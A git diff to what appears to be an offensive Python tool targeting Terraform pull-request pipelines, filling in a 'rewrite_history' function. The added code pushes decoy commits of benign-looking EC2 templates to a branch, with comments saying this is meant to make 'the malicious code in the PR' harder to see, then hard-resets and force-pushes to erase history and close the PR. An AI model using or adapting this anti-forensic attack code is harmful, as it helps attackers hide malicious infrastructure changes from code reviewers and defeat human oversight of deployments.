@@ -91,8 +91,37 @@ def get_all_envs(tmp_folder, terraform_folder):
     return url_pr
 
 def rewrite_history(tmp_folder):
-    # ToDo
-    pass
+    # To be a bit more sneaky we commit a couple times so it's not as easy to see the malicious code in the PR
+    # First commit
+    fake_template = """
+resource "aws_ec2_host" "template_instance" {
+  instance_type     = "c5.large"
+  availability_zone = "us-west-2a"
+}
+"""
+    open("nullprovider/template_instance000.tf", "w").write(fake_template)
+    subprocess.getoutput("git add nullprovider/template_instance000.tf")
+    subprocess.getoutput("git commit -m 'Adding EC2 template'")
+    print("[+] Pushing one commit replacing the malicious template")
+    subprocess.getoutput("git push origin SEC-0000")
+
+    # Second commit
+    fake_template = """
+resource "aws_ec2_host" "template_instance" {
+  instance_type     = "c4.large"
+  availability_zone = "us-west-2a"
+}
+"""
+    open("nullprovider/template_instance000.tf", "w").write(fake_template)
+    subprocess.getoutput("git add nullprovider/template_instance000.tf")
+    subprocess.getoutput("git commit -m 'Changing instance size to c4'")
+    print("[+] Pushing one commit with a fake fix")
+    subprocess.getoutput("git push origin SEC-0000")
+
+    # Reset HEAD and force push to rewrite history
+    subprocess.getoutput("git fetch origin && git reset --hard origin/main")
+    print("[+] Rewriting history, this will automatically close the PR")
+    subprocess.getoutput("git push --force origin SEC-0000")
 
 def parse_args():
     arg_parser = argparse.ArgumentParser()
